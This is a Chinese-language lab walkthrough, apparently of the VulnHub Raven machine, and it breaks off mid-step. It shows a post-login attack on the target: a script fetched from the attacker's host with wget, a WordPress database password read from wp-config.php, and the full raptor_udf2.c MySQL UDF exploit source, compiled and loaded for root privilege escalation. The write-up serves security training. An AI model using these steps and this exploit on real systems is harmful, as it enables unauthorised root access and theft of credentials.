<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh michael@192.168.56.118</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.118 (192.168.56.118)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:rCGKSPq0sUfa5mqn/8/M0T63OxqkEIR39pi835oSDo8.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.56.118<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">michael@192.168.56.118&#x27;</span>s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">You have new mail.</span><br><span class="line">michael@Raven:~$ id</span><br><span class="line">uid=1000(michael) gid=1000(michael) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br><span class="line">michael@Raven:~$ whoami</span><br><span class="line">michael</span><br></pre></td></tr></table></figure>

<p>然后，将目录更改为/tmp并导入了LinEnum.sh，该脚本用于枚举许多基本和高级Linux详细信息。它托管在本地计算机上的文件夹中，并使用wget命令导入到受害者计算机中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.56.1 - - [14/Feb/2020 04:45:37] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [14/Feb/2020 04:45:41] <span class="string">&quot;GET /LinEnum.sh HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.118 - - [14/Feb/2020 04:46:02] <span class="string">&quot;GET /LinEnum.sh HTTP/1.1&quot;</span> 200 -</span><br><span class="line"></span><br><span class="line">michael@Raven:/tmp$ wget 192.168.56.102:8000/LinEnum.sh</span><br><span class="line">--2020-02-15 04:46:01--  http://192.168.56.102:8000/LinEnum.sh</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 46476 (45K) [text/x-sh]</span><br><span class="line">Saving to: ‘LinEnum.sh’</span><br><span class="line"></span><br><span class="line">LinEnum.sh                     100%[=====================================================&gt;]  45.39K  --.-KB/s   <span class="keyword">in</span> 0s     </span><br><span class="line"></span><br><span class="line">2020-02-15 04:46:01 (470 MB/s) - ‘LinEnum.sh’ saved [46476/46476]</span><br><span class="line"></span><br><span class="line">michael@Raven:/tmp$ chmod 777 *</span><br><span class="line">michael@Raven:/tmp$ ls</span><br><span class="line">LinEnum.sh</span><br><span class="line">michael@Raven:/tmp$ ls -la</span><br><span class="line">total 76</span><br><span class="line">drwxrwxrwt  7 root    root     4096 Feb 15 04:46 .</span><br><span class="line">drwxr-xr-x 22 root    root     4096 Aug 13  2018 ..</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .font-unix</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .ICE-unix</span><br><span class="line">-rwxrwxrwx  1 michael michael 46476 Dec 21 00:44 LinEnum.sh</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .Test-unix</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .XIM-unix</span><br></pre></td></tr></table></figure>

<p>然后运行脚本发现下面敏感信息输出结果如下<br>发现MySQL服务正在运行（端口3306很明显）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:587           0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:60286           0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp6       0      0 :::111                  :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::39258                :::*                    LISTEN      -               </span><br><span class="line"></span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">udp        0      0 0.0.0.0:8641            0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:43233           0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:995             0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 127.0.0.1:1005          0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               </span><br><span class="line">udp6       0      0 :::11443                :::*                                -               </span><br><span class="line">udp6       0      0 :::995                  :::*                                -               </span><br><span class="line">udp6       0      0 :::52570                :::*                                -               </span><br><span class="line">udp6       0      0 :::111                  :::*                                -</span><br></pre></td></tr></table></figure>

<p>发现了一个MySQL开发漏洞，远程root代码执行，Privesc漏洞！</p>
<p>参考<span class="exturl" data-url="aHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL2Fkdmlzb3JpZXMvTXlTUUwtRXhwbG9pdC1SZW1vdGUtUm9vdC1Db2RlLUV4ZWN1dGlvbi1Qcml2ZXNjLUNWRS0yMDE2LTY2NjIuaHRtbA==">MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root       547  0.0  0.3   4340  1620 ?        S    04:11   0:00 /bin/sh /usr/bin/mysqld_safe</span><br><span class="line">root       895  0.0  4.5 232508 23072 ?        Ss   04:11   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">root       922  0.0 10.2 814920 51920 ?        Sl   04:12   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --<span class="built_in">log</span>-error=/var/<span class="built_in">log</span>/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306</span><br><span class="line">www-data   986  0.0  7.3 238928 37300 ?        S    04:12   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data   987  0.0  6.8 236172 34664 ?        S    04:12   0:00 /usr/sbin/apache2 -k start</span><br><span class="line">www-data   988  0.0  6.1 234084 31328 ?        S    04:12   0:00 /usr/sbin/apache2 -k start</span><br></pre></td></tr></table></figure>

<p>因此，将当前目录更改为/var/www/html/wordpress并搜索了wp-config文件，因为该文件具有MySQL数据库的密码。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">michael@Raven:/tmp$ <span class="built_in">cd</span> /var/www/html/wordpress</span><br><span class="line">michael@Raven:/var/www/html/wordpress$ ls</span><br><span class="line">index.php    wp-activate.php     wp-comments-post.php  wp-content   wp-links-opml.php  wp-mail.php      wp-trackback.php</span><br><span class="line">license.txt  wp-admin            wp-config.php         wp-cron.php  wp-load.php        wp-settings.php  xmlrpc.php</span><br><span class="line">readme.html  wp-blog-header.php  wp-config-sample.php  wp-includes  wp-login.php       wp-signup.php</span><br><span class="line">michael@Raven:/var/www/html/wordpress$ cat wp-con</span><br><span class="line">wp-config.php         wp-config-sample.php  wp-content/           </span><br><span class="line">michael@Raven:/var/www/html/wordpress$ cat wp-config.php </span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * * MySQL settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix</span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wordpress<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>root<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>R@v3nSecurity<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL hostname */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_HOST<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_CHARSET<span class="string">&#x27;, &#x27;</span>utf8mb4<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** The Database Collate type. Don&#x27;</span>t change this <span class="keyword">if</span> <span class="keyword">in</span> doubt. */</span><br><span class="line">define(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@+</span></span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point <span class="keyword">in</span> time to invalidate all existing cookies. This will force all users to have to <span class="built_in">log</span> <span class="keyword">in</span> again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define(<span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;0&amp;ItXmn^q2d[e*yB:9,L:rR&lt;B`h+DG,zQ&amp;SN&#123;Or3zalh.JE+Q!Gi:L7U[(T:J5ay&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;y@^[*q&#123;)NKZAKK&#123;,AA4y-Ia*swA6/O@&amp;*r&#123;+RS*N!p1&amp;a$*ctt+ I/!?A/Tip(BG&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;.D4&#125;RE4rW2C@9^Bp%#U6i)?cs7,@e]YD:R~fp#hXOk$4o/yDO8b7I&amp;/F7SBSLPlj&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;4L&#123;Cq,%ce2?RRT7zue#R3DezpNq4sFvcCzF@zdmgL/fKpaGX:EpJt/]xZW1_H&amp;46&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;@@?u*YKtt:o/T&amp;V;cbb`.GaJ0./S@dn$t2~n+lR3&#123;PktK]2,*y/b%&lt;BH-Bd#I&#125;oE&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;f0Dc#lKmEJi(:-3+x.V#]Wy@mCmp%njtmFb6`_80[8FK,ZQ=+HH/$&amp; mn=]=/cvd&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;&#125;STRHqy,4scy7v &gt;-..Hc WD*h7rnYq]H`-glDfTVUaOwlh!-/?=3u;##:Rj1]7@&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;i(#~[sXA TbJJfdn&amp;D;0bd`p$r,~.o/?%m&lt;H+&lt;&gt;Vj+,nLvX!-jjjV-o6*HDh5Td&#123;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@-*/</span></span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations <span class="keyword">in</span> one database <span class="keyword">if</span> you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line"><span class="variable">$table_prefix</span>  = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to <span class="literal">true</span> to <span class="built_in">enable</span> the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * <span class="keyword">in</span> their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used <span class="keyword">for</span> debugging,</span><br><span class="line"> * visit the Codex.</span><br><span class="line"> *</span><br><span class="line"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"> */</span><br><span class="line">define(<span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">/* That<span class="string">&#x27;s all, stop editing! Happy blogging. */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Absolute path to the WordPress directory. */</span></span><br><span class="line"><span class="string">if ( !defined(&#x27;</span>ABSPATH<span class="string">&#x27;) )</span></span><br><span class="line"><span class="string">        define(&#x27;</span>ABSPATH<span class="string">&#x27;, dirname(__FILE__) . &#x27;</span>/<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Sets up WordPress vars and included files. */</span></span><br><span class="line"><span class="string">require_once(ABSPATH . &#x27;</span>wp-settings.php<span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>发现密码为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">R@v3nSecurity</span><br></pre></td></tr></table></figure>

<h3 id="发现第一个flag"><a href="#发现第一个flag" class="headerlink" title="发现第一个flag"></a>发现第一个flag</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">michael@Raven:/var/www/html/wordpress$ find / -name <span class="string">&quot;flag*&quot;</span> 2&gt;/dev/null</span><br><span class="line">/var/www/flag2.txt</span><br><span class="line">/usr/share/doc/apache2-doc/manual/tr/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/ja/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/ko/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/zh-cn/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/de/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/es/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/da/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/pt-br/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/fr/rewrite/flags.html</span><br><span class="line">/usr/share/doc/apache2-doc/manual/en/rewrite/flags.html</span><br><span class="line">/sys/devices/pci0000:00/0000:00:11.0/net/eth0/flags</span><br><span class="line">/sys/devices/virtual/net/lo/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS0/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS1/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS2/flags</span><br><span class="line">/sys/devices/platform/serial8250/tty/ttyS3/flags</span><br><span class="line">michael@Raven:/var/www/html/wordpress$ cat /var/www/flag2.txt</span><br><span class="line">flag2&#123;fc3fd58dcdad9ab23faca6e9a36e581c&#125;</span><br></pre></td></tr></table></figure>

<h3 id="mysql-udf提权"><a href="#mysql-udf提权" class="headerlink" title="mysql udf提权"></a>mysql udf提权</h3><p>因此，搜索了UDF动态库漏洞利用程序，并在漏洞利用数据库中将其命名为“1518.c”。</p>
<p>MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line"> * <span class="variable">$Id</span>: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $</span><br><span class="line"> *</span><br><span class="line"> * raptor_udf2.c - dynamic library <span class="keyword">for</span> do_system() MySQL UDF</span><br><span class="line"> * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span><br><span class="line"> *</span><br><span class="line"> * This is an helper dynamic library <span class="keyword">for</span> <span class="built_in">local</span> privilege escalation through</span><br><span class="line"> * MySQL run with root privileges (very bad idea!), slightly modified to work </span><br><span class="line"> * with newer versions of the open-source database. Tested on MySQL 4.1.14.</span><br><span class="line"> *</span><br><span class="line"> * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c</span><br><span class="line"> *</span><br><span class="line"> * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes</span><br><span class="line"> * <span class="keyword">for</span> the security vulnerabilities <span class="keyword">in</span> the handling of User Defined Functions</span><br><span class="line"> * (UDFs) reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further</span><br><span class="line"> * details, please refer to:</span><br><span class="line"> *</span><br><span class="line"> * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html</span><br><span class="line"> * http://www.wisec.it/vulns.php?page=4</span><br><span class="line"> * http://www.wisec.it/vulns.php?page=5</span><br><span class="line"> * http://www.wisec.it/vulns.php?page=6</span><br><span class="line"> *</span><br><span class="line"> * <span class="string">&quot;UDFs should have at least one symbol defined in addition to the xxx symbol </span></span><br><span class="line"><span class="string"> * that corresponds to the main xxx() function. These auxiliary symbols </span></span><br><span class="line"><span class="string"> * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and </span></span><br><span class="line"><span class="string"> * xxx_add() functions&quot;</span>. -- User Defined Functions Security Precautions </span><br><span class="line"> *</span><br><span class="line"> * Usage:</span><br><span class="line"> * $ id</span><br><span class="line"> * uid=500(raptor) gid=500(raptor) groups=500(raptor)</span><br><span class="line"> * $ gcc -g -c raptor_udf2.c</span><br><span class="line"> * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line"> * $ mysql -u root -p</span><br><span class="line"> * Enter password:</span><br><span class="line"> * [...]</span><br><span class="line"> * mysql&gt; use mysql;</span><br><span class="line"> * mysql&gt; create table foo(line blob);</span><br><span class="line"> * mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/home/raptor/raptor_udf2.so&#x27;</span>));</span><br><span class="line"> * mysql&gt; select * from foo into dumpfile <span class="string">&#x27;/usr/lib/raptor_udf2.so&#x27;</span>;</span><br><span class="line"> * mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line"> * mysql&gt; select * from mysql.func;</span><br><span class="line"> * +-----------+-----+----------------+----------+</span><br><span class="line"> * | name      | ret | dl             | <span class="built_in">type</span>     |</span><br><span class="line"> * +-----------+-----+----------------+----------+</span><br><span class="line"> * | do_system |   2 | raptor_udf2.so | <span class="keyword">function</span> |</span><br><span class="line"> * +-----------+-----+----------------+----------+</span><br><span class="line"> * mysql&gt; select do_system(<span class="string">&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;</span>);</span><br><span class="line"> * mysql&gt; \! sh</span><br><span class="line"> * sh-2.05b$ cat /tmp/out</span><br><span class="line"> * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)</span><br><span class="line"> * [...]</span><br><span class="line"> *</span><br><span class="line"> * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">enum Item_result &#123;STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT&#125;;</span><br><span class="line"></span><br><span class="line">typedef struct st_udf_args &#123;</span><br><span class="line">    unsigned int        arg_count;    // number of arguments</span><br><span class="line">    enum Item_result    *arg_type;    // pointer to item_result</span><br><span class="line">    char             **args;        // pointer to arguments</span><br><span class="line">    unsigned long        *lengths;    // length of string args</span><br><span class="line">    char            *maybe_null;    // 1 <span class="keyword">for</span> maybe_null args</span><br><span class="line">&#125; UDF_ARGS;</span><br><span class="line"></span><br><span class="line">typedef struct st_udf_init &#123;</span><br><span class="line">    char            maybe_null;    // 1 <span class="keyword">if</span> func can <span class="built_in">return</span> NULL</span><br><span class="line">    unsigned int        decimals;    // <span class="keyword">for</span> real <span class="built_in">functions</span></span><br><span class="line">    unsigned long         max_length;    // <span class="keyword">for</span> string <span class="built_in">functions</span></span><br><span class="line">    char            *ptr;        // free ptr <span class="keyword">for</span> func data</span><br><span class="line">    char            const_item;    // 0 <span class="keyword">if</span> result is constant</span><br><span class="line">&#125; UDF_INIT;</span><br><span class="line"></span><br><span class="line">int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (args-&gt;arg_count != 1)</span><br><span class="line">        <span class="built_in">return</span>(0);</span><br><span class="line"></span><br><span class="line">    system(args-&gt;args[0]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">return</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// milw0rm.com [2006-02-20]</span><br></pre></td></tr></table></figure>

<p>该漏洞利用是通过将原始C代码编译为“.so”文件，将其传输到受害计算机并利用MySQL漏洞来运行的。第一步是对其进行编译。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># cp /usr/share/exploitdb/exploits/linux/local/1518.c .</span></span><br><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># ls</span></span><br><span class="line">1518.c</span><br><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc</span></span><br><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># ls</span></span><br><span class="line">1518.c  1518.so</span><br></pre></td></tr></table></figure>

<p>然后，启动了本地服务器，并将此1518.so文件传输到受害人的/tmp目录，因为使用wget命令可以通用地读取和写入该文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/raven1<span class="comment"># python -m SimpleHTTPServer </span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">192.168.56.1 - - [14/Feb/2020 05:55:48] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.1 - - [14/Feb/2020 05:55:55] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">192.168.56.118 - - [14/Feb/2020 05:56:12] <span class="string">&quot;GET /1518.so HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">michael@Raven:/tmp$ wget 192.168.56.102:8000/1518.so</span><br><span class="line">--2020-02-15 05:56:10--  http://192.168.56.102:8000/1518.so</span><br><span class="line">Connecting to 192.168.56.102:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 19088 (19K) [application/octet-stream]</span><br><span class="line">Saving to: ‘1518.so’</span><br><span class="line"></span><br><span class="line">1518.so                        100%[=====================================================&gt;]  18.64K  --.-KB/s   <span class="keyword">in</span> 0s     </span><br><span class="line"></span><br><span class="line">2020-02-15 05:56:10 (150 MB/s) - ‘1518.so’ saved [19088/19088]</span><br><span class="line"></span><br><span class="line">michael@Raven:/tmp$ chmod 777 *</span><br><span class="line">michael@Raven:/tmp$ ls -la</span><br><span class="line">total 152</span><br><span class="line">drwxrwxrwt  7 root    root     4096 Feb 15 05:56 .</span><br><span class="line">drwxr-xr-x 22 root    root     4096 Aug 13  2018 ..</span><br><span class="line">-rwxrwxrwx  1 michael michael 19088 Feb 14 21:50 1518.so</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .font-unix</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .ICE-unix</span><br><span class="line">-rwxrwxrwx  1 michael michael 55193 Feb 15 04:48 info.txt</span><br><span class="line">-rwxrwxrwx  1 michael michael 46476 Dec 21 00:44 LinEnum.sh</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .Test-unix</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root    root     4096 Feb 15 04:11 .XIM-unix</span><br></pre></td></tr></table></figure>

<p>下面连接数据库开始提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">michael@Raven:/tmp$ mysql -uroot -pR@v3nSecurity</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 70</span><br><span class="line">Server version: 5.5.60-0+deb8u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wordpress          |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>

<p>在获得MySQL Shell之后，开始使用刚刚发现的漏洞来利用它</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br></pre></td></tr></table></figure>

<p>现在，创建一个名为“foo”的表在此表中，将链接插入了刚刚从本地计算机导入到/tmp目录的1518.so文件。将相同的文件转储到/usr/lib/mysql/plugin/目录（因为它容易受到攻击）在最重要的步骤中，创建了一个名为do_system的UDF函数，该函数将调用实现该函数的代码。因此，正在调用代码“chmod u + s /usr/bin/ find”以将粘性位设置为“find”</p>
